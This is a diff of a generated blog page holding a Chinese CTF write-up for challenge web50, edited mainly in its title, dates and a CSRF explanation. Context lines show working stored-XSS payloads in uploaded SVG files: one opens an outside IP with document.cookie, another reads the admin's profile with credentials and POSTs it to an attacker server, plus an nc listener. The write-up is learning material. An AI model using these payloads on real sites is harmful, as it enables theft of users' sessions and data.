@@ -82,22 +82,22 @@
 
 
 
-<meta name="description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta name="description" content="web50首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可以推测我们上传的东西都会被管理员查看，那么存在client-at">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS 题型记录">
+<meta property="og:title" content="XSS &amp; CSRF 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/XSS题型记录/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta property="og:description" content="web50首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可以推测我们上传的东西都会被管理员查看，那么存在client-at">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png">
-<meta property="og:updated_time" content="2019-09-07T07:23:56.448Z">
+<meta property="og:updated_time" content="2019-12-15T10:16:35.967Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS 题型记录">
-<meta name="twitter:description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta name="twitter:title" content="XSS &amp; CSRF 题型记录[working forever]">
+<meta name="twitter:description" content="web50首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可以推测我们上传的东西都会被管理员查看，那么存在client-at">
 <meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg">
 
 
@@ -134,7 +134,7 @@
 
 
 
-  <title>XSS 题型记录 | CH4SER || 自闭室</title>
+  <title>XSS & CSRF 题型记录[working forever] | CH4SER || 自闭室</title>
   
 
 
@@ -169,7 +169,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">龙信仰总是能抓住战士们的心，或许是因为他们不求言语吧。</p>
+        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
       
   </div>
 
@@ -310,7 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XSS 题型记录</h1>
+          <h1 class="post-title" itemprop="name headline">XSS & CSRF 题型记录[working forever]</h1>
         
 
         <div class="post-meta">
@@ -338,8 +338,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-09-07T15:23:56+08:00">
-                2019-09-07
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-15T18:16:35+08:00">
+                2019-12-15
               </time>
             
           </span>
@@ -425,7 +425,7 @@
       
 
       
-        <h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>这个题目主要考察了XSS攻击，其中攻击的思路很有<code>ssrf</code>的味道。<br>首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。<br>然后有两个选项<code>profile</code>和<code>report bug</code>，前者记录了我们的账户信息。</p>
+        <h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。<br>然后有两个选项<code>profile</code>和<code>report bug</code>，前者记录了我们的账户信息。</p>
 <p>后者包含了一个文本框，提交一些东西之后显示<code>admin will take a look, blah blah, you know what it means</code>，可以推测我们<code>上传的东西都会被管理员查看</code>，那么存在<code>client-attack</code>，最有可能是xss攻击了。</p>
 <p>然后在几个地方尝试XSS注入，发现上传的文件中可以传入xss脚本，并且可以执行，验证脚本如下：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">'XSS!'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
@@ -435,7 +435,7 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.open(<span class="string">"http://207.148.64.125:1234/?$&#123;document.cookie&#125;"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
 
 <p>然后服务器上开nc服务监听。但是并没有东西回显，很有可能是因为<code>httponly</code>的缘故。<code>在httponly下，js是无法操作cookie的</code>。</p>
-<p>但是还有一个方法，管理员在访问我们上传的东西的时候，我们的脚本可以让他去访问他自己的profile，而且在访问的时候肯定是携带自己的cookie的，那么我们可以在脚本中将他访问之后得到的内容直接发送到我们自己的服务器上，这样绕过了cookie安全策略.(<code>原本常规做法是先获取cookie然后亲自去访问profile的,但是这次我们直接让admin自己去访问profile,省却了获取cookie的环节</code>)</p>
+<p>但是还有一个方法，管理员在访问我们上传的东西的时候，我们的脚本可以让他去访问他自己的profile，而且在访问的时候肯定是携带自己的cookie的，那么我们可以在脚本中将他访问之后得到的内容直接发送到我们自己的服务器上，这样绕过了cookie安全策略.(<code>原本常规做法是先获取cookie然后亲自去访问profile的,但是这次我们直接让admin自己去访问profile,省却了获取cookie的环节, cookie是被借用而不是被盗取, 这就是csrf的大致想法</code>)</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">          xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://url:port/"</span>);</span></span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line"><span class="javascript">      xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">      xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">      xhr.send();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里的<code>url:port</code>推荐使用<code>burpsuite</code>的<code>burpcollaborator</code>，但是我的炸了，所以选择使用自己的服务器，使用<code>nc -lvvkp 1234</code>来监听信息。如果一次不行可以再重来一下，我试了两次就出来了flag。</p>
@@ -511,8 +511,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/22/SQL题型记录/" rel="next" title="SQL 题型记录">
-                <i class="fa fa-chevron-left"></i> SQL 题型记录
+              <a href="/2019/04/22/SQL题型记录/" rel="next" title="SQL 题型记录[working forever]">
+                <i class="fa fa-chevron-left"></i> SQL 题型记录[working forever]
               </a>
             
           </div>
@@ -602,7 +602,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
